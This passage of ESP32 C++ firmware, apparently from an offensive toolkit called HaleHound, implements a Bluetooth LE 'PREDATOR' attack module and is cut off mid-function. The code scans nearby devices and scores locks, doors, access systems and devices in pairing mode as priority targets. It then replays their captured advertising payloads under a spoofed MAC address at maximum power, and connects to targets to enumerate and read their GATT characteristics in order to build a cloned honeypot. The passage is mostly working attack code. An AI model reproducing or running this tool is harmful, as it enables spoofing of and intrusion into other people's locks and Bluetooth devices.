    if (mac[0] == 0x3C && mac[1] == 0x6A && mac[2] == 0xA7) return "Intel";
    if (mac[0] == 0x80 && mac[1] == 0x86 && mac[2] == 0xF2) return "Intel";
    if (mac[0] == 0x24 && mac[1] == 0x0A && mac[2] == 0xC4) return "ESP";
    if (mac[0] == 0xA4 && mac[1] == 0xCF && mac[2] == 0x12) return "ESP";
    if (mac[0] == 0x30 && mac[1] == 0xAE && mac[2] == 0xA4) return "ESP";
    if (mac[0] == 0xEC && mac[1] == 0xFA && mac[2] == 0xBC) return "ESP";
    if (mac[0] == 0x08 && mac[1] == 0x3A && mac[2] == 0xF2) return "ESP";
    if (mac[0] == 0x88 && mac[1] == 0x57 && mac[2] == 0x21) return "ESP";
    if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0xF2) return "Msft";
    if (mac[0] == 0x28 && mac[1] == 0x18 && mac[2] == 0x78) return "Msft";
    if (mac[0] == 0x7C && mac[1] == 0x1E && mac[2] == 0x52) return "Msft";
    if (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0x7A) return "Qcomm";
    if (mac[0] == 0x00 && mac[1] == 0x10 && mac[2] == 0x18) return "Brcm";
    if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C) return "Rtk";
    if (mac[0] == 0x00 && mac[1] == 0x9A && mac[2] == 0xCD) return "Huawei";
    if (mac[0] == 0x00 && mac[1] == 0x46 && mac[2] == 0x4B) return "Huawei";
    if (mac[0] == 0x48 && mac[1] == 0x46 && mac[2] == 0xC1) return "Huawei";
    return "???";
}

// Extract company ID from manufacturer data (first 2 bytes LE)
static uint16_t bpExtractCompanyId(uint8_t* mfgData, uint8_t len) {
    if (len < 2) return 0xFFFF;
    return mfgData[0] | (mfgData[1] << 8);
}

// Device display label (from ble_database.h 94-company lookup)
static const char* bpDevLabel(uint16_t companyId, bool hasName) {
    if (companyId != 0xFFFF) {
        const char* name = lookupCompanyName(companyId);
        if (name) return name;
    }
    return hasName ? "Named" : "---";
}

// ═══════════════════════════════════════════════════════════════════════════
// TARGET SCORING — ADV PARSER + CLASSIFICATION
// ═══════════════════════════════════════════════════════════════════════════

// Parsed advertising payload fields (13 bytes stack, zero heap)
struct AdvParsed {
    uint16_t svcUUIDs[4];     // Up to 4 16-bit service UUIDs
    uint16_t appearance;       // GAP appearance value (0xFFFF = absent)
    uint8_t  svcCount;         // How many UUIDs found
    uint8_t  flags;            // AD type 0x01 flags byte
    bool     hasFlags;
};

// Parse raw ADV payload TLV structure
static void bpParseAdvPayload(const uint8_t* payload, uint8_t len, AdvParsed* out) {
    out->svcCount = 0;
    out->appearance = 0xFFFF;
    out->flags = 0;
    out->hasFlags = false;

    uint8_t pos = 0;
    while (pos < len) {
        uint8_t adLen = payload[pos];
        if (adLen == 0 || pos + adLen >= len) break;
        uint8_t adType = payload[pos + 1];
        const uint8_t* data = &payload[pos + 2];
        uint8_t dataLen = adLen - 1;

        switch (adType) {
            case 0x01:  // Flags
                if (dataLen >= 1) {
                    out->flags = data[0];
                    out->hasFlags = true;
                }
                break;
            case 0x02:  // Incomplete 16-bit service UUIDs
            case 0x03:  // Complete 16-bit service UUIDs
                for (uint8_t i = 0; i + 1 < dataLen && out->svcCount < 4; i += 2) {
                    out->svcUUIDs[out->svcCount++] = data[i] | (data[i + 1] << 8);
                }
                break;
            case 0x19:  // Appearance
                if (dataLen >= 2) {
                    out->appearance = data[0] | (data[1] << 8);
                }
                break;
        }
        pos += adLen + 1;
    }
}

// WHAT column label: appearance detail > company name > "Named" > "???"
static const char* bpDevWhat(ReconDevice* d) {
    AdvParsed adv;
    bpParseAdvPayload(d->payload, d->payloadLen, &adv);
    if (adv.appearance != 0xFFFF) {
        const char* detail = lookupAppearanceDetail(adv.appearance);
        if (detail) return detail;
    }
    if (d->companyId != 0xFFFF) {
        const char* co = lookupCompanyName(d->companyId);
        if (co) return co;
    }
    return d->hasName ? "Named" : "???";
}

// Case-insensitive substring search (no stdlib dependency)
static bool bpNameContains(const char* name, const char* sub) {
    if (!name[0] || !sub[0]) return false;
    int nLen = strlen(name);
    int sLen = strlen(sub);
    if (sLen > nLen) return false;
    for (int i = 0; i <= nLen - sLen; i++) {
        bool match = true;
        for (int j = 0; j < sLen; j++) {
            char a = name[i + j];
            char b = sub[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) { match = false; break; }
        }
        if (match) return true;
    }
    return false;
}

// Classify device into RED / SKIP / YELLOW tier
static uint8_t bpClassifyDevice(ReconDevice* d) {
    AdvParsed adv;
    bpParseAdvPayload(d->payload, d->payloadLen, &adv);

    // ── Priority 1-3: RED by service UUID, appearance, company ID ────────
    for (uint8_t i = 0; i < adv.svcCount; i++) {
        if (inProgmemU16List(adv.svcUUIDs[i], redServiceUUIDs, RED_SVC_COUNT))
            return TIER_RED;
    }
    if (adv.appearance != 0xFFFF) {
        if (inProgmemU16List(adv.appearance, redAppearances, RED_APP_COUNT))
            return TIER_RED;
    }
    if (d->companyId != 0xFFFF) {
        if (inProgmemU16List(d->companyId, redCompanyIDs, RED_CID_COUNT))
            return TIER_RED;
    }

    // ── Priority 4: RED by device name patterns ──────────────────────────
    if (d->hasName) {
        static const char* redNames[] = {
            "lock", "safe", "door", "key", "access",
            "keyboard", "provision", "gateway"
        };
        for (int i = 0; i < 8; i++) {
            if (bpNameContains(d->name, redNames[i])) return TIER_RED;
        }
    }

    // ── Priority 5: RED if in pairing mode (LE Limited Discoverable) ─────
    if (adv.hasFlags && (adv.flags & 0x01)) return TIER_RED;

    // ── Priority 6-8: SKIP by service UUID, appearance, company ID ───────
    for (uint8_t i = 0; i < adv.svcCount; i++) {
        if (inProgmemU16List(adv.svcUUIDs[i], skipServiceUUIDs, SKIP_SVC_COUNT))
            return TIER_SKIP;
    }
    if (adv.appearance != 0xFFFF) {
        if (inProgmemU16List(adv.appearance, skipAppearances, SKIP_APP_COUNT))
            return TIER_SKIP;
    }
    if (d->companyId != 0xFFFF) {
        if (inProgmemU16List(d->companyId, skipCompanyIDs, SKIP_CID_COUNT))
            return TIER_SKIP;
    }

    // ── Priority 9: SKIP by device name patterns ─────────────────────────
    if (d->hasName) {
        static const char* skipNames[] = {
            "buds", "pods", "airpod", "speaker", "soundbar",
            "headphone", "earbud", "band", "watch", "fitbit",
            "garmin", "polar", "oura", "beacon", "tile",
            "tag", "gamepad", "controller", "joycon"
        };
        for (int i = 0; i < 19; i++) {
            if (bpNameContains(d->name, skipNames[i])) return TIER_SKIP;
        }
    }

    // ── Priority 10: Default yellow ──────────────────────────────────────
    return TIER_YELLOW;
}

// ═══════════════════════════════════════════════════════════════════════════
// FILTER
// ═══════════════════════════════════════════════════════════════════════════

static bool bpPassesFilter(ReconDevice* d) {
    // SKIP-tier devices are ALWAYS hidden regardless of filter mode
    if (d->tier == TIER_SKIP) return false;
    switch (S->filter) {
        case PF_NAMED:  return d->hasName;
        case PF_STRONG: return d->rssi > -60;
        case PF_HIGH:   return d->tier == TIER_RED;
        default:        return true;
    }
}

static int bpCountFiltered() {
    int count = 0;
    for (int i = 0; i < S->deviceCount; i++) {
        if (bpPassesFilter(&S->devices[i])) count++;
    }
    return count;
}

// Get real device index for a filtered position
static int bpFilteredToReal(int filtIdx) {
    int seen = 0;
    for (int i = 0; i < S->deviceCount; i++) {
        if (!bpPassesFilter(&S->devices[i])) continue;
        if (seen == filtIdx) return i;
        seen++;
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static int bpFindDevice(const uint8_t* mac) {
    for (int i = 0; i < S->deviceCount; i++) {
        if (memcmp(S->devices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

static void bpAddOrUpdate(uint8_t* mac, uint8_t addrType, int8_t rssi,
                           const char* name, bool hasName,
                           uint8_t* mfgData, uint8_t mfgLen,
                           uint8_t* payload, uint8_t payloadLen) {
    uint32_t now = millis();
    int idx = bpFindDevice(mac);

    if (idx >= 0) {
        // Update existing
        ReconDevice* d = &S->devices[idx];
        d->rssi = rssi;
        if (rssi < d->rssiMin) d->rssiMin = rssi;
        if (rssi > d->rssiMax) d->rssiMax = rssi;
        d->lastSeen = now;
        d->frameCount++;
        bool dataChanged = false;
        if (hasName && !d->hasName) {
            strncpy(d->name, name, 16);
            d->name[16] = '\0';
            d->hasName = true;
            dataChanged = true;
        }
        // Update payload if better data
        if (payloadLen > d->payloadLen) {
            memcpy(d->payload, payload, payloadLen);
            d->payloadLen = payloadLen;
            dataChanged = true;
        }
        if (mfgLen > 0 && d->mfgDataLen == 0) {
            uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
            memcpy(d->mfgData, mfgData, copyLen);
            d->mfgDataLen = copyLen;
            uint16_t cid = bpExtractCompanyId(mfgData, mfgLen);
            if (cid != 0xFFFF) d->companyId = cid;
            dataChanged = true;
        }
        // Re-classify if new data could change tier
        if (dataChanged && d->tier == TIER_YELLOW) {
            d->tier = bpClassifyDevice(d);
        }
        return;
    }

    // Add new device
    if (S->deviceCount >= BP_MAX_DEVICES) return;

    ReconDevice* d = &S->devices[S->deviceCount];
    memcpy(d->mac, mac, 6);
    d->addrType = addrType;
    d->rssi = rssi;
    d->rssiMin = rssi;
    d->rssiMax = rssi;
    d->firstSeen = now;
    d->lastSeen = now;
    d->frameCount = 1;
    d->randomMAC = (mac[0] & 0x02) != 0;
    d->selected = false;

    if (payloadLen > 0) {
        uint8_t cpLen = payloadLen > 31 ? 31 : payloadLen;
        memcpy(d->payload, payload, cpLen);
        d->payloadLen = cpLen;
    } else {
        d->payloadLen = 0;
    }

    if (hasName) {
        strncpy(d->name, name, 16);
        d->name[16] = '\0';
        d->hasName = true;
    } else {
        d->name[0] = '\0';
        d->hasName = false;
    }

    strncpy(d->vendor, bpLookupVendor(mac), 7);
    d->vendor[7] = '\0';

    if (mfgLen > 0) {
        uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
        memcpy(d->mfgData, mfgData, copyLen);
        d->mfgDataLen = copyLen;
        d->companyId = bpExtractCompanyId(mfgData, mfgLen);
    } else {
        d->mfgDataLen = 0;
        d->companyId = 0xFFFF;
    }

    S->deviceCount++;
    d->tier = bpClassifyDevice(d);

    #if CYD_DEBUG
    static const char* tierTags[] = {"YEL", "RED", "SKIP"};
    Serial.printf("[PREDATOR] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s pld:%d [%s]\n",
                  S->deviceCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                  rssi, bpDevLabel(d->companyId, d->hasName), d->payloadLen,
                  tierTags[d->tier]);
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN CALLBACK (ISR context → volatile queue)
// ═══════════════════════════════════════════════════════════════════════════

class PredatorCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        if (S->pendingReady) return;  // Queue full, skip frame

        // MAC + address type
        const uint8_t* addr = *advertisedDevice.getAddress().getNative();
        memcpy(S->pendingMAC, addr, 6);
        S->pendingAddrType = advertisedDevice.getAddressType();
        S->pendingRSSI = advertisedDevice.getRSSI();

        // Name
        if (advertisedDevice.haveName() && advertisedDevice.getName().length() > 0) {
            strncpy(S->pendingName, advertisedDevice.getName().c_str(), 16);
            S->pendingName[16] = '\0';
            S->pendingHasName = true;
        } else {
            S->pendingName[0] = '\0';
            S->pendingHasName = false;
        }

        // Manufacturer data
        if (advertisedDevice.haveManufacturerData()) {
            std::string mfg = advertisedDevice.getManufacturerData();
            S->pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
            memcpy(S->pendingMfgData, mfg.data(), S->pendingMfgLen);
        } else {
            S->pendingMfgLen = 0;
        }

        // Full raw ADV payload (the key capture for replay)
        uint8_t* pld = advertisedDevice.getPayload();
        size_t pldLen = advertisedDevice.getPayloadLength();
        if (pld && pldLen > 0) {
            S->pendingPayloadLen = pldLen > 31 ? 31 : pldLen;
            memcpy(S->pendingPayload, pld, S->pendingPayloadLen);
        } else {
            S->pendingPayloadLen = 0;
        }

        S->pendingReady = true;
    }
};

static PredatorCallbacks predatorCB;

// Scan completion → auto-restart for continuous passive listening
static void bpScanComplete(BLEScanResults results) {
    if (S && S->scanning && S->pScan) {
        S->pScan->start(5, bpScanComplete, false);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// REPLAY ENGINE — Raw ESP-IDF broadcast (same pattern as AirTagReplay)
// ═══════════════════════════════════════════════════════════════════════════

static void doReplayBroadcast(ReconDevice& dev) {
    esp_ble_gap_stop_advertising();

    // Set MAC — for random addresses, use directly
    // For public addresses, OR the top 2 bits of byte[5] with 0xC0
    uint8_t replayMac[6];
    memcpy(replayMac, dev.mac, 6);
    if (dev.addrType == BLE_ADDR_TYPE_PUBLIC) {
        replayMac[0] |= 0xC0;  // Force random-static for public MAC replay
    }
    esp_ble_gap_set_rand_addr(replayMac);

    // Send raw payload
    esp_ble_gap_config_adv_data_raw(dev.payload, dev.payloadLen > 0 ? dev.payloadLen : 31);
    delay(1);

    const esp_ble_adv_params_t advP = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    delay(S->replayDwellMs);
    esp_ble_gap_stop_advertising();

    S->replayCount++;
    S->rateWindowCount++;
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 REPLAY TASK
// ═══════════════════════════════════════════════════════════════════════════

static void predReplayTask(void* param) {
    S->replayTaskRunning = true;
    unsigned long rateStart = millis();

    while (S->replaying) {
        if (S->replayMode == RM_SINGLE) {
            // Find first selected device
            int targetIdx = -1;
            for (int i = 0; i < S->deviceCount; i++) {
                if (S->devices[i].selected && S->devices[i].payloadLen > 0) {
                    targetIdx = i;
                    break;
                }
            }
            if (targetIdx < 0) { S->replaying = false; break; }
            doReplayBroadcast(S->devices[targetIdx]);
        } else {
            // RM_ROTATE: cycle through all selected devices
            int startSearch = S->replayRotateIdx;
            bool found = false;
            for (int i = 0; i < S->deviceCount; i++) {
                int idx = (startSearch + i) % S->deviceCount;
                if (S->devices[idx].selected && S->devices[idx].payloadLen > 0) {
                    doReplayBroadcast(S->devices[idx]);
                    S->replayRotateIdx = (idx + 1) % S->deviceCount;
                    found = true;
                    break;
                }
            }
            if (!found) { S->replaying = false; break; }
        }

        // Rate calculation (1-second sliding window)
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            S->replayRate = (uint16_t)S->rateWindowCount;
            S->rateWindowCount = 0;
            rateStart = now;
        }

        vTaskDelay(1);
    }

    S->replayTaskRunning = false;
    vTaskDelete(NULL);
}

static void startReplayTask() {
    if (S->replayTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(predReplayTask, "blePred", 4096, NULL, 1, &S->replayTaskHandle, 0);
}

static void stopReplayTask() {
    S->replaying = false;
    if (S->replayTaskHandle == NULL) return;

    unsigned long start = millis();
    while (S->replayTaskRunning && (millis() - start < 3000)) {
        delay(10);
    }
    if (S->replayTaskRunning) {
        vTaskDelete(S->replayTaskHandle);
    }

    S->replayTaskHandle = NULL;
    S->replayTaskRunning = false;
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP REPLAY (Phase transitions)
// ═══════════════════════════════════════════════════════════════════════════

static void startReplay() {
    // Count selected devices with payload
    int selCount = 0;
    for (int i = 0; i < S->deviceCount; i++) {
        if (S->devices[i].selected && S->devices[i].payloadLen > 0) selCount++;
    }
    if (selCount == 0) return;

    // Auto-set replay mode
    S->replayMode = (selCount > 1) ? RM_ROTATE : RM_SINGLE;
    S->replayRotateIdx = 0;

    // Stop scanning
    if (S->pScan) {
        S->pScan->stop();
        S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
        S->pScan = nullptr;
    }
    S->scanning = false;
    BLEDevice::deinit(false);
    delay(100);

    // Re-init for advertising
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    S->replaying = true;
    S->replayCount = 0;
    S->replayRate = 0;
    S->rateWindowCount = 0;
    S->staticDrawn = false;

    // Phase transition to ATTACK
    S->phase = PHASE_ATTACK;
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
    drawIconBar();
    drawAttackView();

    startReplayTask();

    #if CYD_DEBUG
    Serial.printf("[PREDATOR] Attack started, %d targets, mode=%s, dwell=%dms\n",
                  selCount, S->replayMode == RM_SINGLE ? "SINGLE" : "ROTATE", S->replayDwellMs);
    #endif
}

static void stopReplay() {
    stopReplayTask();

    // Re-init for scanning
    BLEDevice::deinit(false);
    delay(100);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pScan = BLEDevice::getScan();
    if (S->pScan) {
        S->pScan->setActiveScan(false);
        S->pScan->setInterval(100);
        S->pScan->setWindow(99);
        S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
        S->scanning = true;
        S->pScan->start(5, bpScanComplete, false);
    }

    S->staticDrawn = false;
    S->phase = PHASE_LISTEN;

    // Redraw listen UI
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
    drawIconBar();
    drawHeader();
    drawDeviceList();

    #if CYD_DEBUG
    Serial.println("[PREDATOR] Attack stopped, back to LISTEN");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 4: RECON — GATT Client Enumeration
// Connect to target, discover all services/characteristics, build clone table
// ═══════════════════════════════════════════════════════════════════════════

static void drawReconView() {
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
    drawGlitchText(SCALE_Y(50), "PREDATOR", &Nosifer_Regular10pt7b);

    tft.setFreeFont(NULL);
    tft.setTextSize(1);

    // Phase label — BELOW the Nosifer title
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(65), SCALE_Y(58));
    tft.print(">> RECON <<");

    // Divider line between title and status area
    tft.drawLine(0, SCALE_Y(66), SCREEN_WIDTH, SCALE_Y(66), HALEHOUND_HOTPINK);
}

static void drawReconStatus(int line, const char* msg, uint16_t color) {
    int y = SCALE_Y(68) + line * SCALE_H(14);
    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(color, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(8), y + 2);
    tft.print(msg);
}

static void drawReconService(int line, uint16_t uuid16, const uint8_t* uuid128, uint8_t charCount) {
    int y = SCALE_Y(68) + line * SCALE_H(14);
    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(8), y + 2);

    if (uuid16 != 0) {
        const char* svcName = lookupServiceName(uuid16);
        if (svcName) {
            tft.printf("SVC 0x%04X (%s) [%d]", uuid16, svcName, charCount);
        } else {
            tft.printf("SVC 0x%04X [%d chars]", uuid16, charCount);
        }
    } else {
        // Show first 4 bytes of 128-bit UUID
        tft.printf("SVC %02X%02X%02X%02X... [%d]",
                   uuid128[12], uuid128[13], uuid128[14], uuid128[15], charCount);
    }
}

static void drawReconChar(int line, HpCharInfo* c) {
    int y = SCALE_Y(68) + line * SCALE_H(14);
    tft.fillRect(SCALE_X(5), y, SCREEN_WIDTH - SCALE_X(10), SCALE_H(14), HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(15), y + 2);

    char propStr[8];
    int pi = 0;
    if (c->properties & ESP_GATT_CHAR_PROP_BIT_READ)   propStr[pi++] = 'R';
    if (c->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)  propStr[pi++] = 'W';
    if (c->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) propStr[pi++] = 'w';
    if (c->properties & ESP_GATT_CHAR_PROP_BIT_NOTIFY) propStr[pi++] = 'N';
    if (c->properties & ESP_GATT_CHAR_PROP_BIT_INDICATE) propStr[pi++] = 'I';
    propStr[pi] = '\0';

    if (c->uuid16 != 0) {
        tft.printf("  0x%04X %s", c->uuid16, propStr);
    } else {
        tft.printf("  %02X%02X..%02X%02X %s",
                   c->uuid128[12], c->uuid128[13], c->uuid128[14], c->uuid128[15], propStr);
    }
}

static void startRecon() {
    int realIdx = bpFilteredToReal(S->detailIdx);
    if (realIdx < 0 || realIdx >= S->deviceCount) return;

    ReconDevice* target = &S->devices[realIdx];

    // Clear honeypot state from any previous run
    S->hpSvcCount = 0;
    S->hpCharCount = 0;
    S->hpReconDone = false;
    S->hpLootCount = 0;
    S->hpLootScroll = 0;
    S->hpConnCount = 0;
    S->hpActive = false;
    S->hpAdvStarted = false;
    memset(S->hpSvcs, 0, sizeof(S->hpSvcs));
    memset(S->hpChars, 0, sizeof(S->hpChars));
    memset(S->hpLoot, 0, sizeof(S->hpLoot));

    // Phase transition
    S->phase = PHASE_RECON;
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
    drawIconBar();
    drawReconView();

    // Show target info
    char macStr[18];
    bpMacToStr(target->mac, macStr, sizeof(macStr));
    char buf[40];
    snprintf(buf, sizeof(buf), "Target: %s", macStr);
    drawReconStatus(0, buf, HALEHOUND_CYAN);

    // Stop BLE scanning
    if (S->pScan) {
        S->pScan->stop();
        S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
        S->pScan = nullptr;
    }
    S->scanning = false;
    BLEDevice::deinit(false);
    delay(100);

    // Re-init BLE for GATT client mode
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    drawReconStatus(1, "Connecting...", HALEHOUND_HOTPINK);

    // Create GATT client
    BLEClient* pClient = BLEDevice::createClient();
    if (!pClient) {
        drawReconStatus(1, "ERROR: Client create failed", 0xF800);
        delay(2000);
        goBackToListen();
        return;
    }

    // Connect to target — use string address (matches WhisperPair's proven pattern)
    char addrStr[18];
    bpMacToStr(target->mac, addrStr, sizeof(addrStr));
    std::string addrString(addrStr);
    BLEAddress addr(addrString);

    #if CYD_DEBUG
    Serial.printf("[PREDATOR] RECON: Connecting to %s (type=%d)...\n", addrStr, target->addrType);
    #endif

    bool connected = pClient->connect(addr, (esp_ble_addr_type_t)target->addrType);

    // Retry with alternate address type if first attempt fails
    if (!connected) {
        esp_ble_addr_type_t altType;
        if (target->addrType == BLE_ADDR_TYPE_PUBLIC) {
            altType = BLE_ADDR_TYPE_RANDOM;
        } else {
            altType = BLE_ADDR_TYPE_PUBLIC;
        }

        drawReconStatus(1, "Retrying (alt addr type)...", HALEHOUND_HOTPINK);

        #if CYD_DEBUG
        Serial.printf("[PREDATOR] RECON: Retry with addr type %d\n", altType);
        #endif

        connected = pClient->connect(addr, altType);
    }

    if (!connected) {
        drawReconStatus(1, "Connection failed!", 0xF800);
        drawReconStatus(2, "Target not connectable", HALEHOUND_GUNMETAL);
        drawReconStatus(3, "Use REPLAY attack instead", HALEHOUND_GUNMETAL);
        pClient = nullptr;  // deinit cleans up tracked clients
        BLEDevice::deinit(false);
        delay(2000);

        // Go back to TARGET view
        releaseClassicBtMemory();
        BLEDevice::init("");
        delay(150);
        S->pScan = BLEDevice::getScan();
        if (S->pScan) {
            S->pScan->setActiveScan(false);
            S->pScan->setInterval(100);
            S->pScan->setWindow(99);
            S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
            S->scanning = true;
            S->pScan->start(5, bpScanComplete, false);
        }
        S->phase = PHASE_TARGET;
        tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
        drawIconBar();
        drawTargetOverlay();
        return;
    }

    drawReconStatus(1, "Connected! Discovering...", HALEHOUND_MAGENTA);

    #if CYD_DEBUG
    Serial.printf("[PREDATOR] RECON: Connected to %s\n", macStr);
    #endif

    // Discover all services
    std::map<std::string, BLERemoteService*>* svcMap = pClient->getServices();
    if (!svcMap || svcMap->empty()) {
        drawReconStatus(2, "No GATT services found!", 0xF800);
        drawReconStatus(3, "Use REPLAY attack instead", HALEHOUND_GUNMETAL);
        pClient->disconnect();
        pClient = nullptr;  // deinit cleans up tracked clients
        BLEDevice::deinit(false);
        delay(2000);

        releaseClassicBtMemory();
        BLEDevice::init("");
        delay(150);
        S->pScan = BLEDevice::getScan();
        if (S->pScan) {
            S->pScan->setActiveScan(false);
            S->pScan->setInterval(100);
            S->pScan->setWindow(99);
            S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
            S->scanning = true;
            S->pScan->start(5, bpScanComplete, false);
        }
        S->phase = PHASE_TARGET;
        tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
        drawIconBar();
        drawTargetOverlay();
        return;
    }

    // Enumerate services and characteristics
    int displayLine = 2;
    for (auto& kv : *svcMap) {
        if (S->hpSvcCount >= HP_MAX_SERVICES) break;

        BLERemoteService* pSvc = kv.second;
        BLEUUID svcUUID = pSvc->getUUID();

        HpServiceInfo* si = &S->hpSvcs[S->hpSvcCount];
        memset(si, 0, sizeof(HpServiceInfo));
        si->charStart = S->hpCharCount;

        // Extract UUID (16-bit or 128-bit)
        {
            esp_bt_uuid_t* native = svcUUID.getNative();
            if (native->len == ESP_UUID_LEN_16) {
                si->uuid16 = native->uuid.uuid16;
            } else if (native->len == ESP_UUID_LEN_128) {
                memcpy(si->uuid128, native->uuid.uuid128, 16);
            } else if (native->len == ESP_UUID_LEN_32) {
                si->uuid16 = (uint16_t)(native->uuid.uuid32 & 0xFFFF);
            }
        }

        // Get characteristics for this service
        std::map<std::string, BLERemoteCharacteristic*>* charMap = pSvc->getCharacteristics();
        if (charMap) {
            for (auto& ckv : *charMap) {
                if (S->hpCharCount >= HP_MAX_CHARS) break;

                BLERemoteCharacteristic* pChar = ckv.second;
                BLEUUID charUUID = pChar->getUUID();

                HpCharInfo* ci = &S->hpChars[S->hpCharCount];
                memset(ci, 0, sizeof(HpCharInfo));
                ci->svcIdx = S->hpSvcCount;

                // Extract char UUID
                {
                    esp_bt_uuid_t* cNative = charUUID.getNative();
                    if (cNative->len == ESP_UUID_LEN_16) {
                        ci->uuid16 = cNative->uuid.uuid16;
                    } else if (cNative->len == ESP_UUID_LEN_128) {
                        memcpy(ci->uuid128, cNative->uuid.uuid128, 16);
                    } else if (cNative->len == ESP_UUID_LEN_32) {
                        ci->uuid16 = (uint16_t)(cNative->uuid.uuid32 & 0xFFFF);
                    }
                }

                // Build properties byte from canRead/canWrite/canNotify helpers
                ci->properties = 0;
                if (pChar->canRead())          ci->properties |= ESP_GATT_CHAR_PROP_BIT_READ;
                if (pChar->canWrite())         ci->properties |= ESP_GATT_CHAR_PROP_BIT_WRITE;
                if (pChar->canWriteNoResponse()) ci->properties |= ESP_GATT_CHAR_PROP_BIT_WRITE_NR;
                if (pChar->canNotify())        ci->properties |= ESP_GATT_CHAR_PROP_BIT_NOTIFY;
                if (pChar->canIndicate())      ci->properties |= ESP_GATT_CHAR_PROP_BIT_INDICATE;

                // Read cached value if readable
                if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ) {
                    try {
                        std::string val = pChar->readValue();
                        ci->cachedValLen = (val.length() > HP_MAX_READ_VAL) ? HP_MAX_READ_VAL : val.length();
                        if (ci->cachedValLen > 0) {
                            memcpy(ci->cachedVal, val.c_str(), ci->cachedValLen);
                        }
                    } catch (...) {
                        ci->cachedValLen = 0;
                    }
                }

                si->charCount++;
                S->hpCharCount++;
            }
        }

        // Display this service on screen
        if (displayLine < 14) {
            drawReconService(displayLine, si->uuid16, si->uuid128, si->charCount);
            displayLine++;

            // Show first few characteristics
            for (int c = si->charStart; c < si->charStart + si->charCount && displayLine < 14; c++) {
                drawReconChar(displayLine, &S->hpChars[c]);
                displayLine++;
            }
        }

        S->hpSvcCount++;
    }

    // Disconnect from target
    pClient->disconnect();
    pClient = nullptr;  // deinit cleans up tracked clients
    delay(200);

    S->hpReconDone = true;

    #if CYD_DEBUG
    Serial.printf("[PREDATOR] RECON complete: %d services, %d characteristics\n",
                  S->hpSvcCount, S->hpCharCount);
    #endif

    // Show summary
    char summary[48];
    snprintf(summary, sizeof(summary), "Found %d SVCs, %d CHARs",
             S->hpSvcCount, S->hpCharCount);
    if (displayLine < 15) {
        drawReconStatus(displayLine, summary, HALEHOUND_CYAN);
        displayLine++;
    }
    if (displayLine < 15) {
        drawReconStatus(displayLine, "Building honeypot...", HALEHOUND_HOTPINK);
    }
    delay(1000);

    // Deinit BLE client mode before starting GATTS server
